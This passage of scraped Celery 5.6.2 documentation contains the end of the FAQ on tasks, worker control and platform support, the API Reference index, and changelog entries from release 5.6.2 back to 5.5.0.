broker?\n\nThis is an incomplete list of features not available when using the virtual transports:\n\nRemote control commands (supported only by Redis).\n\nMonitoring with events may not work in all virtual transports.\n\nThe header and fanout exchange types\n\n(fanout is supported by Redis).\n\nTasks\nHow can I reuse the same connection when calling tasks?\n\nAnswer: See the broker_pool_limit setting. The connection pool is enabled by default since version 2.5.\n\nsudo in a subprocess returns None\n\nThere’s a sudo configuration option that makes it illegal for process without a tty to run sudo:\n\nDefaults requiretty\n\n\nIf you have this configuration in your /etc/sudoers file then tasks won’t be able to call sudo when the worker is running as a daemon. If you want to enable that, then you need to remove the line from /etc/sudoers.\n\nSee: http://timelordz.com/wiki/Apache_Sudo_Commands\n\nWhy do workers delete tasks from the queue if they’re unable to process them?\n\nAnswer:\n\nThe worker rejects unknown tasks, messages with encoding errors and messages that don’t contain the proper fields (as per the task message protocol).\n\nIf it didn’t reject them they could be redelivered again and again, causing a loop.\n\nRecent versions of RabbitMQ has the ability to configure a dead-letter queue for exchange, so that rejected messages is moved there.\n\nCan I call a task by name?\n\nAnswer: Yes, use app.send_task().\n\nYou can also call a task by name, from any language, using an AMQP client:\n\n>>> app.send_task('tasks.add', args=[2, 2], kwargs={})\n<AsyncResult: 373550e8-b9a0-4666-bc61-ace01fa4f91d>\n\n\nTo use chain, chord or group with tasks called by name, use the Celery.signature() method:\n\n>>> chain(\n...     app.signature('tasks.add', args=[2, 2], kwargs={}),\n...     app.signature('tasks.add', args=[1, 1], kwargs={})\n... ).apply_async()\n<AsyncResult: e9d52312-c161-46f0-9013-2713e6df812d>\n\nCan I get the task id of the current task?\n\nAnswer: Yes, the current id and more is available in the task request:\n\n@app.task(bind=True)\ndef mytask(self):\n    cache.set(self.request.id, \"Running\")\n\n\nFor more information see Task Request.\n\nIf you don’t have a reference to the task instance you can use app.current_task:\n\n>>> app.current_task.request.id\n\n\nBut note that this will be any task, be it one executed by the worker, or a task called directly by that task, or a task called eagerly.\n\nTo get the current task being worked on specifically, use current_worker_task:\n\n>>> app.current_worker_task.request.id\n\n\nNote\n\nBoth current_task, and current_worker_task can be None.\n\nCan I specify a custom task_id?\n\nAnswer: Yes, use the task_id argument to Task.apply_async():\n\n>>> task.apply_async(args, kwargs, task_id='…')\n\nCan I use decorators with tasks?\n\nAnswer: Yes, but please see note in the sidebar at Basics.\n\nCan I use natural task ids?\n\nAnswer: Yes, but make sure it’s unique, as the behavior for two tasks existing with the same id is undefined.\n\nThe world will probably not explode, but they can definitely overwrite each others results.\n\nCan I run a task once another task has finished?\n\nAnswer: Yes, you can safely launch a task inside a task.\n\nA common pattern is to add callbacks to tasks:\n\nfrom celery.utils.log import get_task_logger\n\nlogger = get_task_logger(__name__)\n\n@app.task\ndef add(x, y):\n    return x + y\n\n@app.task(ignore_result=True)\ndef log_result(result):\n    logger.info(\"log_result got: %r\", result)\n\n\nInvocation:\n\n>>> (add.s(2, 2) | log_result.s()).delay()\n\n\nSee Canvas: Designing Work-flows for more information.\n\nCan I cancel the execution of a task?\n\nAnswer: Yes, Use result.revoke():\n\n>>> result = add.apply_async(args=[2, 2], countdown=120)\n>>> result.revoke()\n\n\nor if you only have the task id:\n\n>>> from proj.celery import app\n>>> app.control.revoke(task_id)\n\n\nThe latter also support passing a list of task-ids as argument.\n\nWhy aren’t my remote control commands received by all workers?\n\nAnswer: To receive broadcast remote control commands, every worker node creates a unique queue name, based on the nodename of the worker.\n\nIf you have more than one worker with the same host name, the control commands will be received in round-robin between them.\n\nTo work around this you can explicitly set the nodename for every worker using the -n argument to worker:\n\n$ celery -A proj worker -n worker1@%h\n$ celery -A proj worker -n worker2@%h\n\n\nwhere %h expands into the current hostname.\n\nCan I send some tasks to only some servers?\n\nAnswer: Yes, you can route tasks to one or more workers, using different message routing topologies, and a worker instance can bind to multiple queues.\n\nSee Routing Tasks for more information.\n\nCan I disable prefetching of tasks?\n\nAnswer: Maybe! The AMQP term “prefetch” is confusing, as it’s only used to describe the task prefetching limit. There’s no actual prefetching involved.\n\nDisabling the prefetch limits is possible, but that means the worker will consume as many tasks as it can, as fast as possible.\n\nYou can use the --disable-prefetch flag (or set worker_disable_prefetch to True) so that a worker only fetches a task when one of its processes is free. This feature is currently only supported when using Redis as the broker.\n\nA discussion on prefetch limits, and configuration settings for a worker that only reserves one task at a time is found here: Prefetch Limits.\n\nCan I change the interval of a periodic task at runtime?\n\nAnswer: Yes, you can use the Django database scheduler, or you can create a new schedule subclass and override is_due():\n\nfrom celery.schedules import schedule\n\nclass my_schedule(schedule):\n\n    def is_due(self, last_run_at):\n        return run_now, next_time_to_check\n\nDoes Celery support task priorities?\n\nAnswer: Yes, RabbitMQ supports priorities since version 3.5.0, and the Redis transport emulates priority support.\n\nYou can also prioritize work by routing high priority tasks to different workers. In the real world this usually works better than per message priorities. You can use this in combination with rate limiting, and per message priorities to achieve a responsive system.\n\nShould I use retry or acks_late?\n\nAnswer: Depends. It’s not necessarily one or the other, you may want to use both.\n\nTask.retry is used to retry tasks, notably for expected errors that is catch-able with the try block. The AMQP transaction isn’t used for these errors: if the task raises an exception it’s still acknowledged!\n\nThe acks_late setting would be used when you need the task to be executed again if the worker (for some reason) crashes mid-execution. It’s important to note that the worker isn’t known to crash, and if it does it’s usually an unrecoverable error that requires human intervention (bug in the worker, or task code).\n\nIn an ideal world you could safely retry any task that’s failed, but this is rarely the case. Imagine the following task:\n\n@app.task\ndef process_upload(filename, tmpfile):\n    # Increment a file count stored in a database\n    increment_file_counter()\n    add_file_metadata_to_db(filename, tmpfile)\n    copy_file_to_destination(filename, tmpfile)\n\n\nIf this crashed in the middle of copying the file to its destination the world would contain incomplete state. This isn’t a critical scenario of course, but you can probably imagine something far more sinister. So for ease of programming we have less reliability; It’s a good default, users who require it and know what they are doing can still enable acks_late (and in the future hopefully use manual acknowledgment).\n\nIn addition Task.retry has features not available in AMQP transactions: delay between retries, max retries, etc.\n\nSo use retry for Python errors, and if your task is idempotent combine that with acks_late if that level of reliability is required.\n\nCan I schedule tasks to execute at a specific time?\n\nAnswer: Yes. You can use the eta argument of Task.apply_async(). Note that using distant eta times is not recommended, and in such case periodic tasks should be preferred.\n\nSee ETA and Countdown for more details.\n\nCan I safely shut down the worker?\n\nAnswer: Yes, use the TERM signal.\n\nThis will tell the worker to finish all currently executing jobs and shut down as soon as possible. No tasks should be lost even with experimental transports as long as the shutdown completes.\n\nYou should never stop worker with the KILL signal (kill -9), unless you’ve tried TERM a few times and waited a few minutes to let it get a chance to shut down.\n\nAlso make sure you kill the main worker process only, not any of its child processes. You can direct a kill signal to a specific child process if you know the process is currently executing a task the worker shutdown is depending on, but this also means that a WorkerLostError state will be set for the task so the task won’t run again.\n\nIdentifying the type of process is easier if you have installed the https://pypi.org/project/setproctitle/ module:\n\n$ pip install setproctitle\n\n\nWith this library installed you’ll be able to see the type of process in ps listings, but the worker must be restarted for this to take effect.\n\nSee also\n\nStopping the worker\n\nCan I run the worker in the background on [platform]?\n\nAnswer: Yes, please see Daemonization.\n\nDjango\nWhat purpose does the database tables created by django-celery-beat have?\n\nWhen the database-backed schedule is used the periodic task schedule is taken from the PeriodicTask model, there are also several other helper tables (IntervalSchedule, CrontabSchedule, PeriodicTasks).\n\nWhat purpose does the database tables created by django-celery-results have?\n\nThe Django database result backend extension requires two extra models: TaskResult and GroupResult.\n\nWindows\nDoes Celery support Windows?\n\nAnswer: No.\n\nSince Celery 4.x, Windows is no longer supported due to lack of resources.\n\nBut it may still work and we are happy to accept patches.\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nTask Cookbook\n\nNext topic\n\nChange history\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Frequently Asked Questions\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491591,
    "timestamp": "2026-02-23T00:13:49.444Z",
    "title": "API Reference — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/reference/index.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » API Reference\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nAPI Reference\nRelease:\n\n5.6\n\nDate:\n\nJan 04, 2026\n\nCommand Line Interface\ncelery — Distributed processing\nProxies\nFunctions\ncelery.app.task\nAMQP\nQueues\ncelery.app.defaults\ncelery.app.control\ncelery.app.registry\ncelery.app.backends\ncelery.app.builtins\ncelery.app.events\ncelery.app.log\ncelery.app.utils\ncelery.app.autoretry\ncelery.bootsteps\ncelery.result\ncelery.schedules\ncelery.signals\ncelery.security\ncelery.utils.debug\ncelery.exceptions\ncelery.loaders\ncelery.loaders.app\ncelery.loaders.default\ncelery.loaders.base\nStates\nSets\nMisc\nFAILURE\nPENDING\nRECEIVED\nRETRY\nREVOKED\nSTARTED\nSUCCESS\nprecedence()\nstate\ncelery.contrib.abortable\ncelery.contrib.django.task\ncelery.contrib.migrate\ncelery.contrib.pytest\ncelery.contrib.sphinx\ncelery.contrib.testing.worker\ncelery.contrib.testing.app\ncelery.contrib.testing.manager\ncelery.contrib.testing.mocks\ncelery.contrib.rdb\ncelery.events\ncelery.events.receiver\ncelery.events.state\ncelery.events.event\ncelery.events.state\ncelery.beat\ncelery.apps.worker\ncelery.apps.beat\ncelery.apps.multi\ncelery.worker\ncelery.worker.request\ncelery.worker.state\ncelery.worker.strategy\ncelery.worker.consumer\ncelery.worker.consumer.agent\ncelery.worker.consumer.connection\ncelery.worker.consumer.consumer\ncelery.worker.consumer.control\ncelery.worker.consumer.events\ncelery.worker.consumer.gossip\ncelery.worker.consumer.heart\ncelery.worker.consumer.mingle\ncelery.worker.consumer.tasks\ncelery.worker.worker\ncelery.bin.base\ncelery.bin.celery\ncelery.bin.worker\ncelery.bin.beat\ncelery.bin.events\ncelery.bin.logtool\ncelery.bin.amqp\ncelery.bin.graph\ncelery.bin.multi\ncelery.bin.call\ncelery.bin.control\ncelery.bin.list\ncelery.bin.migrate\ncelery.bin.purge\ncelery.bin.result\ncelery.bin.shell\ncelery.bin.upgrade\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nChange history\n\nNext topic\n\nCommand Line Interface\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » API Reference\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491590,
    "timestamp": "2026-02-23T00:13:49.445Z",
    "title": "Change history — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/changelog.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » Change history\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nChange history\n\nThis document contains change notes for bugfix & new features in the main branch & 5.6.x series, please see What’s new in Celery 5.6 (Recovery) for an overview of what’s new in Celery 5.6.\n\n5.6.2\nrelease-date:\n\n2026-01-04\n\nrelease-by:\n\nTomer Nosrati\n\nWhat’s Changed\n\nFix recursive WorkController instantiation in DjangoWorkerFixup + AttributeError when pool_cls is a string (#10045)\n\nBugfix: Revoked tasks now immediately update backend status to REVOKED (#9869)\n\nPrepare for release: v5.6.2 (#10049)\n\n5.6.1\nrelease-date:\n\n2025-12-29\n\nrelease-by:\n\nTomer Nosrati\n\nWhat’s Changed\n\nFix Redis Sentinel ACL authentication support (#10013)\n\nFix: Broker heartbeats not sent during graceful shutdown (#9986)\n\ndocs #5410 – Document confirm_publish broker transport option (#10016)\n\nclose DB pools only in prefork mode (#10020)\n\nFix: Avoid unnecessary Django database connection creation during cleanup (#10015)\n\nreliable prefork detection (#10023)\n\nbetter coverage (#10029)\n\nDocs: clarify result_extended vs periodic task metadata and show headers[“periodic_task_name”] example (#10030)\n\nStop importing pytest_subtests (#10032)\n\nOnly use exceptiongroup backport for Python < 3.11 (#10033)\n\nPrepare for release: v5.6.1 (#10037)\n\n5.6.0\nrelease-date:\n\n2025-11-30\n\nrelease-by:\n\nTomer Nosrati\n\nCelery v5.6.0 is now available.\n\nKey Highlights\n\nSee What’s new in Celery 5.6 (Recovery) for a complete overview or read the main highlights below.\n\nPython 3.9 Minimum Version\n\nCelery 5.6.0 drops support for Python 3.8 (EOL). The minimum required Python version is now 3.9. Users still on Python 3.8 must upgrade their Python version before upgrading to Celery 5.6.0.\n\nAdditionally, this release includes initial support for Python 3.14.\n\nSQS: Reverted to pycurl from urllib3\n\nThe switch from pycurl to urllib3 for the SQS transport (introduced in Celery 5.5.0 via Kombu) has been reverted due to critical issues affecting SQS users:\n\nProcessing throughput dropped from ~100 tasks/sec to ~3/sec in some environments\n\nUnknownOperationException errors causing container crash loops\n\nSilent message processing failures with no error logs\n\nUsers of the SQS transport must ensure pycurl is installed. If you removed pycurl after upgrading to Celery 5.5.0, you will need to reinstall it.\n\nContributed by @auvipy in #9620.\n\nSecurity Fix: Broker Credential Leak Prevention\n\nFixed a security issue where broker URLs containing passwords were being logged in plaintext by the delayed delivery mechanism. Broker credentials are now properly sanitized in all log output.\n\nContributed by @giancarloromeo in #9997.\n\nMemory Leak Fixes\n\nTwo significant memory leaks have been fixed in this release:\n\nException Handling Memory Leak: Fixed a critical memory leak in task exception handling that was particularly severe on Python 3.11+ due to enhanced traceback data. The fix properly breaks reference cycles in tracebacks to allow garbage collection.\n\nContributed by @jaiganeshs21 in #9799.\n\nPending Result Memory Leak: Fixed a memory leak where AsyncResult subscriptions were not being cleaned up when results were forgotten.\n\nContributed by @tsoos99dev in #9806.\n\nETA Task Memory Limit\n\nNew configuration option worker_eta_task_limit to prevent out-of-memory crashes when workers fetch large numbers of ETA or countdown tasks. Previously, workers could exhaust available memory when the broker contained many scheduled tasks.\n\nExample usage:\n\napp.conf.worker_eta_task_limit = 1000\n\n\nContributed by @sashu2310 in #9853.\n\nQueue Type Selection for Auto-created Queues\n\nNew configuration options allow specifying the queue type and exchange type when Celery auto-creates missing queues. This is particularly useful for RabbitMQ users who want to use quorum queues with auto-created queues.\n\nConfiguration options:\n\ntask_create_missing_queue_type: Sets the queue type for auto-created queues (e.g., quorum, classic)\n\ntask_create_missing_queue_exchange_type: Sets the exchange type for auto-created queues\n\nExample usage:\n\napp.conf.task_create_missing_queue_type = 'quorum'\n\n\nContributed by @ghirailghiro in #9815.\n\nWhat’s Changed\n\nPrepare for release: v5.6.0 (#10010)\n\n5.6.0rc2\nrelease-date:\n\n2025-11-22\n\nrelease-by:\n\nTomer Nosrati\n\nCelery v5.6.0 Release Candidate 2 is now available for testing. Please help us test this version and report any issues.\n\nWhat’s Changed\n\nRemove Python 4.0 version condition for pytest dependencies (#9993)\n\nSanitize broker URL in delayed delivery logs (avoid leaking credentials) (#9997)\n\nDon’t fail task on timeout during cold shutdown (#9678)\n\nAdd Py39-314t to CI (#9999)\n\nasynpool: Don’t return from inside a finally block (#10000)\n\nPrepare for (pre) release: v5.6.0rc2 (#10005)\n\n5.6.0rc1\nrelease-date:\n\n2025-11-02\n\nrelease-by:\n\nTomer Nosrati\n\nCelery v5.6.0 Release Candidate 1 is now available for testing. Please help us test this version and report any issues.\n\nWhat’s Changed\n\nAdd support for Django Connection pool (#9953)\n\nPin tblib to ==3.1.0 (#9967)\n\nfix(worker): continue to attempt to bind other queues after a native delayed delivery binding failure has occurred (#9959)\n\nHandle UnpicklingError in persistent scheduler initialization (#9952)\n\nBug Fix: Nested Chords Fail When Using django-celery-results with a Redis Backend (#9950)\n\nAdd support pymongo 4.12 (#9665)\n\nMake tests compatible with pymongo >= 4.14 (#9968)\n\ntblib updated from 3.1.0 to 3.2.0 (#9970)\n\nFix remaining function typing and docstring (#9971)\n\nFix regex pattern in version parsing and remove duplicate entry in __all__ (#9978)\n\nBump Kombu to v5.6.0 and removed <5.7 limit on kombu (#9981)\n\nPrepare for (pre) release: v5.6.0rc1 (#9982)\n\n5.6.0b2\nrelease-date:\n\n2025-10-20\n\nrelease-by:\n\nTomer Nosrati\n\nCelery v5.6.0 Beta 2 is now available for testing. Please help us test this version and report any issues.\n\nWhat’s Changed\n\nGitHub Actions: Test on Python 3.14 release candidate 2 (#9891)\n\nUpdate pypy to python 3.11 (#9896)\n\nFeature: Add support credential_provider to Redis Backend (#9879)\n\nCelery.timezone: try tzlocal.get_localzone() before using LocalTimezone (#9862)\n\nRun integration tests on Python 3.14 (#9903)\n\nFix arithmetic overflow for MSSQL result backend (#9904)\n\nAdd documentation for task_id param for apply_async function (#9906)\n\nSupport redis client name (#9900)\n\nBump Kombu to v5.6.0rc1 (#9918)\n\nFix broker connection retry attempt counter in the error log (#9911)\n\nfix: restrict disable-prefetch feature to Redis brokers only (#9919)\n\nfix(): preserve group order in replaced signature (#9910)\n\nRemove Python 3.8 from CI workflow (#9930)\n\nUpdate default Python versions in integration tests (#9931)\n\nUpdate tox.ini to remove Python 3.8 (#9932)\n\nRemove Python 3.8 from Dockerfile (#9933)\n\nUpdate Python version requirement to 3.9 (#9935)\n\nUpdate pypy version from 3.10 to 3.11 in Dockerfile (#9934)\n\nFlake8 fixes (#9955)\n\nRemove test-pypy3.txt from Dockerfile dependencies (#9939)\n\nRemove backports.zoneinfo for Python 3.9 compatibility (#9956)\n\nUpdate pytest-cov version for Python compatibility (#9957)\n\nUpdate pytest-rerunfailures and pre-commit versions (#9958)\n\nPrepare for (pre) release: v5.6.0b2 (#9938)\n\n5.6.0b1\nrelease-date:\n\n2025-09-15\n\nrelease-by:\n\nTomer Nosrati\n\nCelery v5.6.0 Beta 1 is now available for testing. Please help us test this version and report any issues.\n\nWhat’s Changed\n\ndocs: mention of json serializer recursive reference message size blowup (#5000) (#9743)\n\ndocs: typo in canvas.rst (#9744)\n\nMakes _on_retry return a float as required to be used as errback on retry_over_time (#9741)\n\nUpdate canvas.rst doc calculation order for callback (#9758)\n\nUpdated Blacksmith logo (#9763)\n\nMade the Sponsors logos link to their website (#9764)\n\nadd missing cloudamqp logo (#9767)\n\nImprove sponsor visibility (#9768)\n\nfix: (#9773) task_id must not be empty with chain as body of a chord (#9774)\n\nUpdate setup.py to fix deprecation warning (#9771)\n\nAdds integration test for chord_unlock bug when routed to quorum/topic queue (#9766)\n\nAdd xfail test for default queue/exchange fallback ignoring task_default_* settings (#9765)\n\nAdd xfail test for RabbitMQ quorum queue global QoS race condition (#9770)\n\nfix: (#8786) time out when chord header fails with group body (#9788)\n\nFix #9738 : Add root_id and parent_id to .apply() (#9784)\n\nReplace DelayedDelivery connection creation to use context manger (#9793)\n\nFix #9794: Pydantic integration fails with __future__.annotations. (#9795)\n\nadd go and rust implementation in docs (#9800)\n\nFix memory leak in exception handling (Issue #8882) (#9799)\n\nFix handlers docs (Issue #9787) (#9804)\n\nRemove importlib_metadata leftovers (#9791)\n\nUpdate timeout minutes for smoke tests CI (#9807)\n\nRevert “Remove dependency on pycurl” (#9620)\n\nAdd Blacksmith Docker layer caching to all Docker builds (#9840)\n\nBump Kombu to v5.6.0b1 (#9839)\n\nDisable pytest-xdist for smoke tests and increase retries (CI ONLY) (#9842)\n\nFix Python 3.13 compatibility in events dumper (#9826)\n\nDockerfile Build Optimizations (#9733)\n\nMigrated from useblacksmith/build-push-action@v1 to useblacksmith/setup-docker-builder@v1 in the CI (#9846)\n\nRemove incorrect example (#9854)\n\nRevert “Use Django DB max age connection setting” (#9824)\n\nFix pending_result memory leak (#9806)\n\nUpdate python-package.yml (#9856)\n\nBump Kombu to v5.6.0b2 (#9858)\n\nRefactor integration and smoke tests CI (#9855)\n\nFix AsyncResult.forget() with couchdb backend method raises TypeError: a bytes-like object is required, not ‘str’ (#9865)\n\nImprove Docs for SQS Authentication (#9868)\n\nAdded .github/copilot-instructions.md for GitHub Copilot (#9874)\n\nmisc: credit removal (#9877)\n\nChoose queue type and exchange type when creating missing queues (fix #9671) (#9815)\n\nfix: prevent celery from hanging due to spawned greenlet errors in greenlet drainers (#9371)\n\nFeature/disable prefetch fixes (#9863)\n\nAdd worker_eta_task_limit configuration to manage ETA task memory usage (#9853)\n\nUpdate runner version in Docker workflow (#9884)\n\nPrepare for (pre) release: v5.6.0b1 (#9890)\n\n5.5.3\nrelease-date:\n\n2025-06-01\n\nrelease-by:\n\nTomer Nosrati\n\nWhat’s Changed\n\nmake the tests run on python 3.13 for gcs backend (#9677)\n\nAdded DeepWiki to README (#9683)\n\nLimit redis to <=v5.2.1 to match Kombu (#9693)\n\nUse EX_OK instead of literal zero (#9684)\n\nMake wheel metadata reproducible (#9687)\n\nlet celery install from kombu dependencies for better align (#9696)\n\nFix stamping documentation to clarify stamped_headers key is optional in visitor methods (#9697)\n\nSupport apply_async without queue argument on quorum queues (#9686)\n\nUpdated rabbitmq doc about using quorum queues with task routes (#9707)\n\nAdd: Dumper Unit Test (#9711)\n\nAdd unit test for event.group_from (#9709)\n\nrefactor: add beat_cron_starting_deadline documentation warning (#9712)\n\nfix: resolve issue #9569 by supporting distinct broker transport options for workers (#9695)\n\nFixes issue with retry callback arguments in DelayedDelivery (#9708)\n\nget_exchange-unit-test (#9710)\n\nISSUE-9704: Update documentation of result_expires, filesystem backend is supported (#9716)\n\nupdate to blacksmith ubuntu 24.04 (#9717)\n\nAdded unit tests for celery.utils.iso8601 (#9725)\n\nUpdate introduction.rst docs (#9728)\n\nPrepare for release: v5.5.3 (#9732)\n\n5.5.2\nrelease-date:\n\n2025-04-25\n\nrelease-by:\n\nTomer Nosrati\n\nWhat’s Changed\n\nFix calculating remaining time across DST changes (#9669)\n\nRemove setup_logger from COMPAT_MODULES (#9668)\n\nFix mongodb bullet and fix github links in contributions section (#9672)\n\nPrepare for release: v5.5.2 (#9675)\n\n5.5.1\nrelease-date:\n\n2025-04-08\n\nrelease-by:\n\nTomer Nosrati\n\nWhat’s Changed\n\nFixed “AttributeError: list object has no attribute strip” with quorum queues and failover brokers (#9657)\n\nPrepare for release: v5.5.1 (#9660)\n\n5.5.0\nrelease-date:\n\n2025-03-31\n\nrelease-by:\n\nTomer Nosrati\n\nCelery v5.5.0 is now available.\n\nKey Highlights\n\nSee What’s new in Celery 5.5 (Immunity) for a complete overview or read the main highlights below.\n\nRedis Broker Stability Improvements\n\nLong-standing disconnection issues with the Redis broker have been identified and resolved in Kombu 5.5.0, which is included with this release. These improvements significantly enhance stability when using Redis as a broker.\n\nAdditionally, the Redis backend now has better exception handling with the new exception_safe_to_retry feature, which improves resilience during temporary Redis connection issues. See Redis backend settings for complete documentation.\n\nContributed by @drienkop in #9614.\n\npycurl replaced with urllib3\n\nReplaced the https://pypi.org/project/pycurl/ dependency with https://pypi.org/project/urllib3/.\n\nWe’re monitoring the performance impact of this change and welcome feedback from users who notice any significant differences in their environments.\n\nContributed by @spawn-guy in Kombu #2134 and integrated in Celery via #9526.\n\nRabbitMQ Quorum Queues Support\n\nAdded support for RabbitMQ’s new Quorum Queues feature, including compatibility with ETA tasks. This implementation has some limitations compared to classic queues, so please refer to the documentation for details.\n\nNative Delayed Delivery is automatically enabled when quorum queues are detected to implement the ETA mechanism.\n\nSee Using Quorum Queues for complete documentation.\n\nConfiguration options:\n\nbroker_native_delayed_delivery_queue_type: Specifies the queue type for delayed delivery (default: quorum)\n\ntask_default_queue_type: Sets the default queue type for tasks (default: classic)\n\nworker_detect_quorum_queues: Controls automatic detection of quorum queues (default: True)\n\nContributed in #9207, #9121, and #9599.\n\nFor details regarding the 404 errors, see New Year’s Security Incident.\n\nSoft Shutdown Mechanism\n\nSoft shutdown is a time limited warm shutdown, initiated just before the cold shutdown. The worker will allow worker_soft_shutdown_timeout seconds for all currently executing tasks to finish before it terminates. If the time limit is reached, the worker will initiate a cold shutdown and cancel all currently executing tasks.\n\nThis feature is particularly valuable when using brokers with visibility timeout mechanisms, such as Redis or SQS. It allows the worker enough time to re-queue tasks that were not completed before exiting, preventing task loss during worker shutdown.\n\nSee Stopping the worker for complete documentation on worker shutdown types.\n\nConfiguration options:\n\nworker_soft_shutdown_timeout: Sets the duration in seconds for the soft shutdown period (default: 0.0, disabled)\n\nworker_enable_soft_shutdown_on_idle: Controls whether soft shutdown should be enabled even when the worker is idle (default: False)\n\nContributed by @Nusnus in #9213, #9231, and #9238.\n\nPydantic Support\n\nNew native support for Pydantic models in tasks. This integration allows you to leverage Pydantic’s powerful data validation and serialization capabilities directly in your Celery tasks.\n\nExample usage:\n\nfrom pydantic import BaseModel\nfrom celery import Celery\n\napp = Celery('tasks')\n\nclass ArgModel(BaseModel):\n    value: int\n\nclass ReturnModel(BaseModel):\n    value: str\n\n@app.task(pydantic=True)\ndef x(arg: ArgModel) -> ReturnModel:\n    # args/kwargs type hinted as Pydantic model will be converted\n    assert isinstance(arg, ArgModel)\n\n    # The returned model will be converted to a dict automatically\n    return ReturnModel(value=f\"example: {arg.value}\")\n\n\nSee Argument validation with Pydantic for complete documentation.\n\nConfiguration options:\n\npydantic=True: Enables Pydantic integration for the task\n\npydantic_strict=True/False: Controls whether strict validation is enabled (default: False)\n\npydantic_context={...}: Provides additional context for validation\n\npydantic_dump_kwargs={...}: Customizes serialization behavior\n\nContributed by @mathiasertl in #9023, #9319, and #9393.\n\nGoogle Pub/Sub Transport\n\nNew support for Google Cloud Pub/Sub as a message transport, expanding Celery’s cloud integration options.\n\nSee Using Google Pub/Sub for complete documentation.\n\nFor the Google Pub/Sub support you have to install additional dependencies:\n\n$ pip install \"celery[gcpubsub]\"\n\n\nThen configure your Celery application to use the Google Pub/Sub transport:\n\nbroker_url = 'gcpubsub://projects/project-id'\n\n\nContributed by @haimjether in #9351.\n\nPython 3.13 Support\n\nOfficial support for Python 3.13. All core dependencies have been updated to ensure compatibility, including Kombu and py-amqp.\n\nThis release maintains compatibility with Python 3.8 through 3.13, as well as PyPy 3.10+.\n\nContributed by @Nusnus in #9309 and #9350.\n\nREMAP_SIGTERM Support\n\nThe “REMAP_SIGTERM” feature, previously undocumented, has been tested, documented, and is now officially supported. This feature allows you to remap the SIGTERM signal to SIGQUIT, enabling you to initiate a soft or cold shutdown using TERM instead of QUIT.\n\nThis is particularly useful in containerized environments where SIGTERM is the standard signal for graceful termination.\n\nSee Cold Shutdown documentation for more info.\n\nTo enable this feature, set the environment variable:\n\nexport REMAP_SIGTERM=\"SIGQUIT\"\n\n\nContributed by @Nusnus in #9461.\n\nDatabase Backend Improvements\n\nNew create_tables_at_setup option for the database backend. This option controls when database tables are created, allowing for non-lazy table creation.\n\nBy default (create_tables_at_setup=True), tables are created during backend initialization. Setting this to False defers table creation until they are actually needed, which can be useful in certain deployment scenarios where you want more control over database schema management.\n\nSee Database backend settings for complete documentation.\n\nConfiguration:\n\napp.conf.result_backend = 'db+sqlite:///results.db'\napp.conf.database_create_tables_at_setup = False\n\n\nContributed by @MarcBresson in #9228.\n\nWhat’s Changed\n\n(docs): use correct version celery v.5.4.x (#8975)\n\nUpdate mypy to 1.10.0 (#8977)\n\nLimit pymongo<4.7 when Python <= 3.10 due to breaking changes in 4.7 (#8988)\n\nBump pytest from 8.1.1 to 8.2.0 (#8987)\n\nUpdate README to Include FastAPI in Framework Integration Section (#8978)\n\nClarify return values of …_on_commit methods (#8984)\n\nadd kafka broker docs (#8935)\n\nLimit pymongo<4.7 regardless of Python version (#8999)\n\nUpdate pymongo[srv] requirement from <4.7,>=4.0.2 to >=4.0.2,<4.8 (#9000)\n\nUpdate elasticsearch requirement from <=8.13.0 to <=8.13.1 (#9004)\n\nsecurity: SecureSerializer: support generic low-level serializers (#8982)\n\ndon’t kill if pid same as file (#8997) (#8998)\n\nUpdate cryptography to 42.0.6 (#9005)\n\nBump cryptography from 42.0.6 to 42.0.7 (#9009)\n\ndon’t kill if pid same as file (#8997) (#8998) (#9007)\n\nAdded -vv to unit, integration and smoke tests (#9014)\n\nSecuritySerializer: ensure pack separator will not be conflicted with serialized fields (#9010)\n\nUpdate sphinx-click to 5.2.2 (#9025)\n\nBump sphinx-click from 5.2.2 to 6.0.0 (#9029)\n\nFix a typo to display the help message in first-steps-with-django (#9036)\n\nPinned requests to v2.31.0 due to docker-py bug #3256 (#9039)\n\nFix certificate validity check (#9037)\n\nRevert “Pinned requests to v2.31.0 due to docker-py bug #3256” (#9043)\n\nBump pytest from 8.2.0 to 8.2.1 (#9035)\n\nUpdate elasticsearch requirement from <=8.13.1 to <=8.13.2 (#9045)\n\nFix detection of custom task set as class attribute with Django (#9038)\n\nUpdate elastic-transport requirement from <=8.13.0 to <=8.13.1 (#9050)\n\nBump pycouchdb from 1.14.2 to 1.16.0 (#9052)\n\nUpdate pytest to 8.2.2 (#9060)\n\nBump cryptography from 42.0.7 to 42.0.8 (#9061)\n\nUpdate elasticsearch requirement from <=8.13.2 to <=8.14.0 (#9069)\n\n[enhance feature] Crontab schedule: allow using month names (#9068)\n\nEnhance tox environment: [testenv:clean] (#9072)\n\nClarify docs about Reserve one task at a time (#9073)\n\nGCS docs fixes (#9075)\n\nUse hub.remove_writer instead of hub.remove for write fds (#4185) (#9055)\n\nClass method to process crontab string (#9079)\n\nFixed smoke tests env bug when using integration tasks that rely on Redis (#9090)\n\nBugfix - a task will run multiple times when chaining chains with groups (#9021)\n\nBump mypy from 1.10.0 to 1.10.1 (#9096)\n\nDon’t add a separator to global_keyprefix if it already has one (#9080)\n\nUpdate pymongo[srv] requirement from <4.8,>=4.0.2 to >=4.0.2,<4.9 (#9111)\n\nAdded missing import in examples for Django (#9099)\n\nBump Kombu to v5.4.0rc1 (#9117)\n\nRemoved skipping Redis in t/smoke/tests/test_consumer.py tests (#9118)\n\nUpdate pytest-subtests to 0.13.0 (#9120)\n\nIncreased smoke tests CI timeout (#9122)\n\nBump Kombu to v5.4.0rc2 (#9127)\n\nUpdate zstandard to 0.23.0 (#9129)\n\nUpdate pytest-subtests to 0.13.1 (#9130)\n\nChanged retry to tenacity in smoke tests 